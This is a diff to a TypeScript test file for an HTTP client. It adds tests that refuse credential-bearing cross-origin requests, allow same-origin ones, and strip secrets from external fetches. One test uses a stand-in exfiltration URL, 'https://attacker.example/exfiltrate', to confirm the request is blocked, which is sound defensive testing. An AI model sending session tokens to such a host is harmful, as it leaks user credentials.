@@ -1,17 +1,92 @@
-import { afterEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import {
   ApiError,
+  fetchExternal,
   requestBlob,
   requestJson,
   requestJsonWithHeaders,
   setRefreshCallback,
 } from "@/lib/api/http-client";
 import { readPaginationHeaders } from "@/lib/api/pagination-headers";
+import { saveStoredSession, clearStoredSession } from "@/lib/api/session-storage";
+import type { Session } from "@/features/auth/session-types";
+
+const TEST_SESSION: Session = {
+  user: {
+    id: "00000000-0000-4000-8000-000000000001",
+    username: "ops.admin",
+    role: "SYSTEM_ADMIN",
+    lspId: null,
+    mustChangePassword: false,
+  },
+  accessToken: "session-access-token",
+  expiresAt: "2099-01-01T00:00:00.000Z",
+};
 
 describe("http-client", () => {
+  beforeEach(() => {
+    clearStoredSession();
+  });
+
   afterEach(() => {
     vi.unstubAllGlobals();
     setRefreshCallback(null);
+    clearStoredSession();
+  });
+
+  it("refuses credential-bearing cross-origin absolute URLs before fetch", async () => {
+    saveStoredSession(TEST_SESSION);
+    const fetchMock = vi.fn();
+    vi.stubGlobal("fetch", fetchMock);
+
+    await expect(requestJson("https://attacker.example/exfiltrate")).rejects.toThrow(
+      /Refusing cross-origin authenticated request/,
+    );
+    expect(fetchMock).not.toHaveBeenCalled();
+  });
+
+  it("allows same-origin absolute URLs", async () => {
+    vi.stubGlobal(
+      "fetch",
+      vi.fn().mockResolvedValue(
+        new Response(JSON.stringify({ ok: true }), {
+          status: 200,
+          headers: { "Content-Type": "application/json" },
+        }),
+      ),
+    );
+
+    await expect(
+      requestJson(
+        "http://localhost:8080/api/v1/internal/home/overview",
+        {},
+        { authenticated: false },
+      ),
+    ).resolves.toEqual({ ok: true });
+  });
+
+  it("fetchExternal strips caller-supplied credentials and idempotency metadata", async () => {
+    const fetchMock = vi.fn().mockResolvedValue(new Response("ok", { status: 200 }));
+    vi.stubGlobal("fetch", fetchMock);
+    saveStoredSession(TEST_SESSION);
+
+    await fetchExternal("https://hooks.example.com/ping", {
+      method: "GET",
+      credentials: "include",
+      headers: {
+        Authorization: "Bearer caller-secret",
+        "Idempotency-Key": "internal-operation-key",
+        "X-Public-Header": "safe",
+      },
+    });
+
+    expect(fetchMock).toHaveBeenCalledTimes(1);
+    const [, init] = fetchMock.mock.calls[0] as [string, RequestInit];
+    expect(init.credentials).toBe("omit");
+    const headers = new Headers(init.headers);
+    expect(headers.get("Authorization")).toBeNull();
+    expect(headers.get("Idempotency-Key")).toBeNull();
+    expect(headers.get("X-Public-Header")).toBe("safe");
   });
 
   it("surfaces Retry-After on 429 responses", async () => {
